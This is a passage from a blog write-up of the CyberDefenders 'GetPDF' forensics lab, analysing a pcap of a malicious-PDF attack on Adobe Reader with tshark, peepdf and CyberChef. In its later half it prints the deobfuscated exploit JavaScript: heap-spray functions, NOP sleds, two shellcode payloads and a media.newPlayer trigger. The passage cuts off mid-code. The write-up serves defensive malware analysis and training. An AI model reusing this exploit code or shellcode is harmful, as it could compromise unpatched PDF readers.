<!DOCTYPE html>
<html lang="en-us"><head><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">GetPDF Writeup - CyberDefenders | Malxplorer</title>
<meta property="og:title" content="GetPDF Writeup - CyberDefenders | Malxplorer" />
<meta name="twitter:title" content="GetPDF Writeup - CyberDefenders | Malxplorer" />
<meta itemprop="name" content="GetPDF Writeup - CyberDefenders | Malxplorer" />
<meta name="application-name" content="GetPDF Writeup - CyberDefenders | Malxplorer" />
<meta property="og:site_name" content="Awesome hugo blog" />

<meta name="description" content="The network traffic is captured in lala.pcap contains network traffic related to a typical malicious PDF file attack, in which an unsuspecting user opens a compromised web page, which redirects the user’s web browser to a URL of a malicious PDF file. As the PDF plug-in of the browser opens the PDF, the unpatched version of Adobe Acrobat Reader is exploited and, as a result, downloads and silently installs malware on the user’s machine.">
<meta itemprop="description" content="The network traffic is captured in lala.pcap contains network traffic related to a typical malicious PDF file attack, in which an unsuspecting user opens a compromised web page, which redirects the user’s web browser to a URL of a malicious PDF file. As the PDF plug-in of the browser opens the PDF, the unpatched version of Adobe Acrobat Reader is exploited and, as a result, downloads and silently installs malware on the user’s machine." />
<meta property="og:description" content="The network traffic is captured in lala.pcap contains network traffic related to a typical malicious PDF file attack, in which an unsuspecting user opens a compromised web page, which redirects the user’s web browser to a URL of a malicious PDF file. As the PDF plug-in of the browser opens the PDF, the unpatched version of Adobe Acrobat Reader is exploited and, as a result, downloads and silently installs malware on the user’s machine." />
<meta name="twitter:description" content="The network traffic is captured in lala.pcap contains network traffic related to a typical malicious PDF file attack, in which an unsuspecting user opens a compromised web page, which redirects the user’s web browser to a URL of a malicious PDF file. As the PDF plug-in of the browser opens the PDF, the unpatched version of Adobe Acrobat Reader is exploited and, as a result, downloads and silently installs malware on the user’s machine." />

<meta property="og:locale" content="en-us" />
<meta name="language" content="en-us" />



  <meta itemprop="image" content="https://naimulislam9m.github.io" />
  <meta property="og:image" content="https://naimulislam9m.github.io" />
  <meta name="twitter:image" content="https://naimulislam9m.github.io" />
  <meta name="twitter:image:src" content="https://naimulislam9m.github.io" />




    
    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2023-08-06T00:00:00Z />
    <meta property="article:published_time" content=2023-08-06T00:00:00Z />

    
    <meta property="og:article:author" content="Naimul islam" />
    <meta property="article:author" content="Naimul islam" />
    <meta name="author" content="Naimul islam" />
    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "GetPDF Writeup - CyberDefenders",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2023-08-06",
        "description": "The network traffic is captured in lala.pcap contains network traffic related to a typical malicious PDF file attack, in which an unsuspecting user opens a compromised web page, which redirects the user’s web browser to a URL of a malicious PDF file. As the PDF plug-in of the browser opens the PDF, the unpatched version of Adobe Acrobat Reader is exploited and, as a result, downloads and silently installs malware on the user’s machine.",
        "wordCount":  1628 ,
        "mainEntityOfPage": "True",
        "dateModified": "2023-08-06",
        "image": {
        "@type": "imageObject",
        "url": ""
        },
        "publisher": {
        "@type": "Organization",
        "name": "Malxplorer"
        }
    }
    </script>


<meta name="generator" content="Hugo 0.118.2">

    

    <link rel="canonical" href="https://naimulislam9m.github.io/posts/getpdf-writeup-cyberdefenders/">
    <link href="/style.min.9bd04d0fad85388343088ec85e9afd787ea003e72914d7f57df39c17ab2e7173.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="https://naimulislam9m.github.io/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    
    </head>
<body data-theme = "dark" class="notransition">

<script src="/js/theme.min.8961c317c5b88b953fe27525839672c9343f1058ab044696ca225656c8ba2ab0.js" integrity="sha256-iWHDF8W4i5U/4nUlg5ZyyTQ/EFirBEaWyiJWVsi6KrA="></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <b style="font-size: 20px;">
            <a href="https://naimulislam9m.github.io/" class="title">
                Malxplorer
                
            </a>
        </b>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        Home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link active" href="/posts/">
                        Posts
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/about/">
                        About
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">GetPDF Writeup - CyberDefenders</h1>
                
                
                <div class="post-meta">
                    <time datetime="2023-08-06T00:00:00&#43;00:00" itemprop="datePublished"> 6 Aug 2023 </time>
                </div>
                
            </header>
            <details class="toc">
                <summary><b>Table of Contents</b></summary>
                <nav id="TableOfContents">
  <ul>
    <li><a href="#1-how-many-url-paths-are-involved-in-this-incident">1. How many URL path(s) are involved in this incident?</a></li>
    <li><a href="#2-what-is-the-url-which-contains-the-js-code">2. What is the URL which contains the JS code?</a></li>
    <li><a href="#3-what-is-the-url-hidden-in-the-js-code">3. What is the URL hidden in the JS code?</a></li>
    <li><a href="#4-what-is-the-md5-hash-of-the-pdf-file-contained-in-the-packet">4. What is the MD5 hash of the PDF file contained in the packet?</a></li>
    <li><a href="#5-how-many-objects-are-contained-inside-the-pdf-file">5. How many object(s) are contained inside the PDF file?</a></li>
    <li><a href="#6-how-many-filtering-schemes-are-used-for-the-object-streams">6. How many filtering schemes are used for the object streams?</a></li>
    <li><a href="#7-what-is-the-number-of-the-object-stream-that-might-contain-malicious-js-code">7. What is the number of the &lsquo;object stream&rsquo; that might contain malicious JS code?</a></li>
    <li><a href="#8-analyzing-the-pdf-file-what-object-streams-contain-the-js-code-responsible-for-executing-the-shellcodes-the-js-code-is-divided-into-two-streams-format-two-numbers-separated-with--put-the-numbers-in-ascending-order">8. Analyzing the PDF file. What &lsquo;object-streams&rsquo; contain the JS code responsible for executing the shellcodes? The JS code is divided into two streams. Format: two numbers separated with &lsquo;,&rsquo;. Put the numbers in ascending order</a></li>
    <li><a href="#9-the-js-code-responsible-for-executing-the-exploit-contains-shellcodes-that-drop-malicious-executable-files-what-is-the-full-path-of-malicious-executable-files-after-being-dropped-by-the-malware-on-the-victim-machine">9. The JS code responsible for executing the exploit contains shellcodes that drop malicious executable files. What is the full path of malicious executable files after being dropped by the malware on the victim machine?</a></li>
    <li><a href="#10-the-pdf-file-contains-another-exploit-related-to-cve-2010-0188-what-is-the-url-of-the-malicious-executable-that-the-shellcode-associated-with-this-exploit-drop">10. The PDF file contains another exploit related to CVE-2010-0188. What is the URL of the malicious executable that the shellcode associated with this exploit drop?</a></li>
    <li><a href="#11-how-many-cves-are-included-in-the-pdf-file">11. How many CVEs are included in the PDF file?</a></li>
  </ul>
</nav>
            </details><div class="page-content">
                <p><img src="https://cyberdefenders.org/media/terraform/GetPDF/GetPDF.jpg" alt=""></p>
<blockquote>
<p>PDF format is the de-facto standard in exchanging documents online. Such popularity, however, has also attracted cyber criminals in spreading malware to unsuspecting users. The ability to generate malicious pdf files to distribute malware is a functionality that has been built into many exploit kits. As users are less cautious about opening PDF files, the malicious PDF file has become quite a successful attack vector.
The network traffic is captured in lala.pcap contains network traffic related to a typical malicious PDF file attack, in which an unsuspecting user opens a compromised web page, which redirects the user’s web browser to a URL of a malicious PDF file. As the PDF plug-in of the browser opens the PDF, the unpatched version of Adobe Acrobat Reader is exploited and, as a result, downloads and silently installs malware on the user’s machine.</p>
<p>As a soc analyst, analyze the PDF and answer the questions.</p>
</blockquote>
<h2 id="1-how-many-url-paths-are-involved-in-this-incident">1. How many URL path(s) are involved in this incident?</h2>
<pre tabindex="0"><code>tshark -r lala.pcap -Y http.request -T fields -e http.request.full_uri | sort -u | wc -l
6
</code></pre><h2 id="2-what-is-the-url-which-contains-the-js-code">2. What is the URL which contains the JS code?</h2>
<p>In tcp stream 0 I found <code>&lt;script&gt;</code> tag that contains JS.</p>
<pre tabindex="0"><code>http://blog.honeynet.org.my/forensic_challenge/
</code></pre><h2 id="3-what-is-the-url-hidden-in-the-js-code">3. What is the URL hidden in the JS code?</h2>
<p><img src="https://imgur.com/Il3rV01.png" alt=""></p>
<p>As GaDemee is eval so we will change it to colsole.log to print the payload.</p>
<p><img src="https://imgur.com/bpNT5el.png" alt=""></p>
<h2 id="4-what-is-the-md5-hash-of-the-pdf-file-contained-in-the-packet">4. What is the MD5 hash of the PDF file contained in the packet?</h2>
<p>Export the &lsquo;fcexploit.pdf&rsquo; from &lsquo;file &gt; export object &gt; http&rsquo; as this is only file which have content type as pdf.</p>
<pre tabindex="0"><code>md5sum fcexploit.pdf
659cf4c6baa87b082227540047538c2a  fcexploit.pdf
</code></pre><h2 id="5-how-many-objects-are-contained-inside-the-pdf-file">5. How many object(s) are contained inside the PDF file?</h2>
<pre tabindex="0"><code>&gt; pdfid.py fcexploit.pdf

PDFiD 0.2.8 fcexploit.pdf
PDF Header: %PDF-1.3
obj                   19
endobj                18
stream                 5
endstream              5
xref                   1
trailer                1
startxref              1
/Page                  2
/Encrypt               0
/ObjStm                0
/JS                    1
/JavaScript            1
/AA                    0
/OpenAction            1
/AcroForm              1
/JBIG2Decode           0
/RichMedia             0
/Launch                0
/EmbeddedFile          1
/XFA                   1
/URI                   0
/Colors &gt; 2^24         0
</code></pre><h2 id="6-how-many-filtering-schemes-are-used-for-the-object-streams">6. How many filtering schemes are used for the object streams?</h2>
<pre tabindex="0"><code>&gt; pdf-parser.py -s filter fcexploit.pdf  

obj 5 0
Type:  
Referencing:  
Contains stream

 &lt;&lt;
   /Length 395
   /Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ]
 &gt;
[...]
</code></pre><h2 id="7-what-is-the-number-of-the-object-stream-that-might-contain-malicious-js-code">7. What is the number of the &lsquo;object stream&rsquo; that might contain malicious JS code?</h2>
<p>Using peepdf I found object 4 contains JS, Javascript string and object 5 contains Javascript code. Going to object 4 it points to object 5, which contains javascript code.</p>
<pre tabindex="0"><code>&gt; peepdf -i -f fcexploit.pdf

File: fcexploit.pdf
MD5: 659cf4c6baa87b082227540047538c2a
SHA1: a93bf00077e761152d4ff8a695c423d14c9a66c9
SHA256: ba3c7c763f7910ef956e27be054e9271b00d05aab9fb153cdf30001ce422d68a
Size: 25169 bytes
Version: 1.3
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 18
Streams: 5
URIs: 0
Comments: 0
Errors: 2

Version 0:
       Catalog: 27
       Info: 11
       Objects (18): [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 22, 23, 24, 25, 26, 27, 28]
               Errors (1): [11]
       Streams (5): [5, 7, 9, 10, 11]
               Encoded (4): [5, 7, 9, 10]
       Objects with JS code (1): [5]
       Suspicious elements:
               /AcroForm (1): [27]
               /OpenAction (1): [1]
               /XFA (1): [28]
               /JS (1): [4]
               /JavaScript (1): [4]
               getAnnots (CVE-2009-1492) (1): [5]



PPDF&gt; object 4

&lt;&lt; /Type /Action
/S /JavaScript
/JS 5 0 R &gt;&gt;

PPDF&gt; object 5

&lt;&lt; /Length 395
/Filter [ /FlateDecode /ASCII85Decode /LZWDecode /RunLengthDecode ] &gt;&gt;
stream

var SSS=null;var SS=&#34;ev&#34;;var $S=&#34;&#34;;$5=&#34;in&#34;;app.doc.syncAnnotScan();S$=&#34;ti&#34;;if(app.plugIns.length!=0){var $$=0;S$+=&#34;tl&#34;;$5+=&#34;fo&#34;;____SSS=app.doc.getAnnots({nPage:0});S$+=&#34;e
&#34;;$S=this.info.title;}var S5=&#34;&#34;;if(app.plugIns.length&gt;3){SS+=&#34;a&#34;;var arr=$S.split(/U_155bf62c9aU_7917ab39/);for(var $=1;$&lt;arr.length;$++){S5+=String.fromCharCode(&#34;0x&#34;+arr[
$]);}SS+=&#34;l&#34;;}if(app.plugIns.length&gt;=2){app[SS](S5);}

endstream
</code></pre><h2 id="8-analyzing-the-pdf-file-what-object-streams-contain-the-js-code-responsible-for-executing-the-shellcodes-the-js-code-is-divided-into-two-streams-format-two-numbers-separated-with--put-the-numbers-in-ascending-order">8. Analyzing the PDF file. What &lsquo;object-streams&rsquo; contain the JS code responsible for executing the shellcodes? The JS code is divided into two streams. Format: two numbers separated with &lsquo;,&rsquo;. Put the numbers in ascending order</h2>
<p>From peepdf we find object 5, 7, 9, 10, 11 has stream of content.</p>
<pre tabindex="0"><code>[...]
Streams (5): [5, 7, 9, 10, 11]
[...]
</code></pre><p>So to see the streams I opened the pdf in &lsquo;pdf stream dumper&rsquo; tool. The tools shows all the stream objects in blue color. Object 5 has javascript code. So I open javascript UI to run the code.</p>
<p><img src="https://i.imgur.com/8Y1acXx.png" alt=""></p>
<p>It will emulate the pdf reader environment and give us the code.</p>
<p><img src="https://i.imgur.com/OrkGOFS.png" alt=""></p>
<p>After analyzing the the code i found that the JS code is taking the content of object 7 and 9.</p>
<pre tabindex="0"><code>___SS=1;
dump_9=____SSS[____SS].subject;
____$S=0;
res=dump_9.replace(/X_17844743X_170987743/g,&#34;%&#34;);
dump_7=____SSS[____$S].subject;
res+=dump_7.replace(/89af50d/g,&#34;%&#34;);
res=res.replace(/\n/,&#34;&#34;);
res=res.replace(/\r/,&#34;&#34;);
____S$=unescape(res);
app.eval(____S$);
</code></pre><p>So after doing the replace operation in a text editor I dumped the text in cyberchef and used <a href="https://cyberchef.org/#recipe=Find_/_Replace(%7B'option':'Regex','string':'%25'%7D,'%20',true,false,true,false)From_Hex('Auto')">this</a> recipe to get the following JS code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">app</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">s</span><span class="p">(</span><span class="nx">yarsp</span><span class="p">,</span> <span class="nx">len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="nx">yarsp</span><span class="p">.</span><span class="nx">length</span> <span class="o">*</span> <span class="mi">2</span> <span class="o">&lt;</span> <span class="nx">len</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">yarsp</span> <span class="o">+=</span> <span class="nx">yarsp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">this</span><span class="p">.</span><span class="nx">x</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">eI</span> <span class="o">=</span> <span class="mi">37715</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">yarsp</span> <span class="o">=</span> <span class="nx">yarsp</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">len</span> <span class="o">/</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nx">yarsp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">yE</span> <span class="o">=</span> <span class="mi">18340</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">m</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">String</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">cG</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">chunk_size</span><span class="p">,</span> <span class="nx">payload</span><span class="p">,</span> <span class="nx">nopsled</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">chunk_size</span> <span class="o">=</span> <span class="mh">0x8000</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// calc.exe payload
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="nx">payload</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">		<span class="s2">&#34;%uabba%ua906%u29f1%ud9c9%ud9c9%u2474%ub1f4%u5d64%uc583%u3104%u0f55%u5503%ue20f%ued5e%uabb9%uc1ea%u2d70%u1953%u3282%u6897%ud01d%u872d%ufd18%ua73a%u02dc%u14cc%u64ba%u66b5%uae41%uf16c%u5623%udb7c%u7bc1%u5e69%u69dd%uf0b0%ucf0c%u1950%udd95%u5ab9%u7b37%u772b%uc55f%u1531%ue18d%u70c8%uc2c5%u4c1c%u7b34%u2f3a%ue82b%u27c9%u848b%ua512%u999d%u2faa%u84c0%u2bee%u768c%u0bc8%u237e%u4cc6%u51c2%u3abc%ufc45%u1118%uffe5%uf48a%udf14%u6c2f%u8742%u0a57%u6fe9%ub5b5%uca94%ua6ab%u84ba%u77d1%u4a2c%u74ac%uabcf%ub25f%ub269%u5e06%u51d5%u90f3%u978f%uec66%u6942%u6a9b%u18a2%u12ff%u42ba%u7be5%ubb37%u9dc6%u5de0%ufe14%uf2f7%uc6fd%u7812%uda44%u7167%u110f%ubb01%uf81a%ud953%ufc21%u22db%u20f7%u46b9%u27e6%ue127%u8e42%udb91%ufe58%ubaeb%u6492%u07fe%uade3%u4998%uf89a%u9803%u5131%u1192%ufcd5%u3ac9%u352d%u71de%u81cb%u4522%u6d21%uecd2%ucb1c%u4e6d%u8df8%u6eeb%ubff8%u653d%ubaf6%u8766%ud10b%u926b%ubf19%u9f4a%u0a30%u8a92%u7727%u96a7%u6347%ud3b4%u824a%uc4ae%uf24c%uf5ff%ud99b%u0ae1%u7b99%u133d%u91ad%u2573%u96a6%u3b74%ub2a1%u3c73%ue92c%u468c%uea25%u5986%u9261%u71b5%u5164%u71b3%u561f%uabf7%u91c2%ua3e6%uab09%ub60f%ua23c%ub92f%ub74b%ua308%u3cdb%ua4dd%u9221%u2732%u8339%u892b%u34a9%ub0da%ua550%u4f47%u568c%uc8fa%uc5fe%u3983%u7a98%u2306%uf60a%uc88f%u9b8d%u6e27%u305d%u1edd%uadfa%ub232%u4265%u2d3a%uff17%u83f5%u87b2%u5b90&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">nopsled</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&#34;%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">while</span> <span class="p">(</span><span class="nx">nopsled</span><span class="p">.</span><span class="nx">length</span> <span class="o">&lt;</span> <span class="nx">chunk_size</span><span class="p">)</span> <span class="nx">nopsled</span> <span class="o">+=</span> <span class="nx">nopsled</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="nx">nopsled_len</span> <span class="o">=</span> <span class="nx">chunk_size</span> <span class="o">-</span> <span class="p">(</span><span class="nx">payload</span><span class="p">.</span><span class="nx">length</span> <span class="o">+</span> <span class="mi">20</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">nopsled</span> <span class="o">=</span> <span class="nx">nopsled</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">nopsled_len</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="nx">heap_chunks</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">2500</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="nx">heap_chunks</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">=</span> <span class="nx">nopsled</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nx">util</span><span class="p">.</span><span class="nx">printd</span><span class="p">(</span><span class="s2">&#34;1.000000000.000000000.1337 : 3.13.37&#34;</span><span class="p">,</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">());</span>
</span></span><span class="line"><span class="cl">	<span class="k">try</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="nx">media</span><span class="p">.</span><span class="nx">newPlayer</span><span class="p">(</span><span class="kc">null</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">	<span class="nx">util</span><span class="p">.</span><span class="nx">printd</span><span class="p">(</span><span class="s2">&#34;1.000000000.000000000.1337 : 3.13.37&#34;</span><span class="p">,</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">());</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">cN</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">o</span> <span class="o">=</span> <span class="s2">&#34;o&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="c1">// freecell.exe payload
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kd">var</span> <span class="nx">payload</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">		<span class="s2">&#34;%uc929%u65b1%ud7db%u74d9%uf424%u83b8%u3830%u5b84%u4331%u0313%u1343%u6883%udacc%u8571%u413d%u6a30%u13f7%ub07d%u5c06%uc249%ube91%u3948%ud6a4%u4246%ud958%uf0e9%ubf3e%ucb93%uf8bc%u520a%u60a7%ubd5e%u804d%ub8b6%ub75a%u5391%uf6b0%ub933%uea10%ubade%u91ba%ud64b%u1fdb%ub411%ub731%u92ab%uf842%u2a7a%ua0b8%uc819%uc7af%u9bee%u7d10%u4e2e%u4201%u8a96%ude7c%ud1cb%u20f0%ue235%uf4e3%u33a8%u6fbe%u8396%u15b9%ub97f%ud56a%u2c92%uf698%ud416%u50c7%u7361%u386d%u1a83%ue308%u7fb1%u7a3f%u20ac%u90a8%u2d99%u544b%u1868%ucced%u8012%u7b51%u7bef%u4d0b%u4095%u10c6%udea5%ue327%u47ed%u9d3e%u28f4%u51cb%ucfd7%u746c%u8c04%u286b%u95cd%u4396%u0b57%u58e2%ue11e%u508a%uab14%uf7cf%uab12%ufb47%u96c3%u9932%ud41d%u3bda%u7d77%uf214%ub242%u636f%u299d%u2962%u7be8%u7fe4%ub283%ub18f%uee39%u7b09%ub7de%ue345%u8c16%u2e59%u59c0%u6fa5%u263f%uda5e%u8219%ua5d1%u54fc%u0474%u75fc%u53b1%u7f0b%u599a%u9409%u48e7%uf318%u71c6%uc930%u6317%u3126%ua923%u2249%ua830%u4247%uad22%u3340%ude7b%u9f86%ue365%u8693%ufdba%u5594%u0f8f%u59bf%u0de8%u74d9%u16ff%ua327%u1cf0%ub333%u021a%uda1c%u2831%u2868%u583f%u1c0a%u720b%u6af0%u8a62%u64fe%u8883%u7ecc%u83ab%u823a%ufd8c%u0ead%u8e59%uc117%u0c8e%u7204%ufeb6%ue3bc%u9a56%u9545%u10c3%u0698%ube7e%ub5ca%u6f07%u2a75%u0a8a%uc717%ub603%u44b8%u59bc%ue62b%uf459%u93d4%u658e%u377a%u14a6%ua20e%ue517%u49c0%u6cd0%u419d&#34;</span>
</span></span><span class="line"><span class="cl">	<span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">dN</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">nop</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&#34;%u0A0A%u0A0A%u0A0A%u0A0A&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">hW</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">String</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">heapblock</span> <span class="o">=</span> <span class="nx">nop</span> <span class="o">+</span> <span class="nx">payload</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">qA</span> <span class="o">=</span> <span class="s2">&#34;qA&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">bigblock</span> <span class="o">=</span> <span class="nx">unescape</span><span class="p">(</span><span class="s2">&#34;%u0A0A%u0A0A&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">this</span><span class="p">.</span><span class="nx">alphaY</span> <span class="o">=</span> <span class="mi">12267</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">headersize</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">spray</span> <span class="o">=</span> <span class="nx">headersize</span> <span class="o">+</span> <span class="nx">heapblock</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="kd">var</span> <span class="nx">jZ</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
